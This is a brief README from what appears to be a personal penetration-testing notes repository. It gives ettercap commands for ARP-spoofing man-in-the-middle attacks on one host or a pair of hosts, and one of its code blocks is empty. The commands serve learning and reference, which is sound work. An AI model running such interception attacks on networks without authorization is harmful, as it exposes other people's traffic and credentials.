**Welcome to pentest-docs!**

This repository is used to document a dump of tools I've used to penetration test. The main purpose of this dump is to track my learnings and to serve as a reference point.

All of the following commands have only been tested on Kali Linux on my Macbook Pro (Retina, 13-inch, Early 2015).

**Download Kali Linux from the official website:**

**Purchase a USB wifi dongle compatible with Kali Linux (I'm using a TL-WN722N TP-Link):**

**Performing a MITM (man in the middle) attack:**

Attacking every host on the network:

```

```

Attacking one host on the network:

```
ettercap -Tqi <interface> -M arp:remote /<host-ip>///
```

Attacking two hosts on the network:

```
ettercap -Tqi <interface> -M arp:remote /<host-1-ip>//<host-2-ip>/
```
